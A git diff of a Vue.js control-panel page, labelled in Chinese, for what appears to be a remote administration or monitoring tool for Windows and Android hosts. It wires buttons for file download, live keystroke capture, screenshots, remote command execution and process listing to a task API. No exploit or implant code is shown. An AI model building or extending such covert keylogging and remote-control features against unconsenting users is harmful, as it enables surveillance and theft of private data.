@@ -50,29 +50,18 @@
             <template v-if="host.status">
               <template v-if="activeTabKey === 'file'">
                 <a-row class="control-field">
-                  <a-input-search placeholder="文件/目录路径" size="large">
+                  <a-input-search placeholder="文件路径" size="large" v-model="pathInput" @search="execute($const.cmd.getFileContent, { path: pathInput })">
                     <a-button slot="enterButton" type="primary">
-                      操作文件/目录
+                      下载文件
                     </a-button>
                   </a-input-search>
-                </a-row>
-                <a-divider/>
-                <a-row class="control-field">
-                  <a-button type="primary" size="large" style="width: 100%">上传文件</a-button>
                 </a-row>
               </template>
               <template v-else-if="activeTabKey === 'keyboard'">
                 <a-row class="control-field">
-                  <a-button type="primary" size="large" style="width: 100%">开启实时显示</a-button>
+                  <a-button type="primary" size="large" style="width: 100%" @click="execute($const.cmd.listenKeyboard)">开启实时显示</a-button>
                 </a-row>
                 <a-row class="control-field" style="text-align: center">Windows为键盘监听，Android为输入框监听</a-row>
-                <a-divider/>
-                <a-row class="control-field">
-                  <a-button type="primary" size="large" style="width: 100%">开始日志记录</a-button>
-                </a-row>
-                <a-row class="control-field">
-                  <a-button size="large" style="width: 100%">查看日志记录</a-button>
-                </a-row>
               </template>
               <template v-else-if="activeTabKey === 'clipboard'">
                 <a-row class="control-field">
@@ -81,19 +70,21 @@
               </template>
               <template v-else-if="activeTabKey === 'screen'">
                 <a-row class="control-field">
-                  <a-button type="primary" size="large" style="width: 100%">获取当前截屏</a-button>
-                </a-row>
-                <a-row class="control-field">
-                  <a-button size="large" style="width: 100%">查看历史截屏</a-button>
+                  <a-button type="primary" size="large" style="width: 100%" @click="execute($const.cmd.getScreenshot)">获取当前截屏</a-button>
                 </a-row>
               </template>
               <template v-else-if="activeTabKey === 'command'">
                 <a-row class="control-field">
-                  <a-input-search placeholder="命令" size="large">
-                    <a-button slot="enterButton" type="primary" :disabled="host.os === 1">
+                  <a-input-search placeholder="命令" size="large" v-model="commandInput" :disabled="host.os === 1" @search="execute($const.cmd.execCommand, { command: commandInput })">
+                    <a-button slot="enterButton"
+                              type="primary"
+                              :disabled="host.os === 1">
                       执行命令
                     </a-button>
                   </a-input-search>
+                </a-row>
+                <a-row class="control-field">
+                  <a-button type="primary" size="large" style="width: 100%" @click="execute($const.cmd.getProcessList)">查看进程列表</a-button>
                 </a-row>
               </template>
               <template v-else-if="activeTabKey === 'notification'">
@@ -167,14 +158,16 @@ export default {
         },
         {
           key: 'command',
-          tab: '命令'
+          tab: '命令/进程'
         },
         {
           key: 'notification',
           tab: '通知'
         }
       ],
-      activeTabKey: 'file'
+      activeTabKey: 'file',
+      commandInput: '',
+      pathInput: ''
     }
   },
   methods: {
@@ -226,9 +219,10 @@ export default {
           this.isDeleting = false
         })
     },
-    execute (cmd) {
+    execute (cmd, params) {
+      console.log(cmd)
       this.isWaitingForTaskCreating = true
-      api.task.create({ os: this.host.os, id: this.host.id, cmd })
+      api.task.create({ os: this.host.os, id: this.host.id, cmd, params })
         .then((res) => {
           this.$message.success(`任务 ${res.data.id} 创建成功`)
           this.$router.push({ name: 'taskDetail', params: { hostId: this.host.id, taskId: res.data.id } })
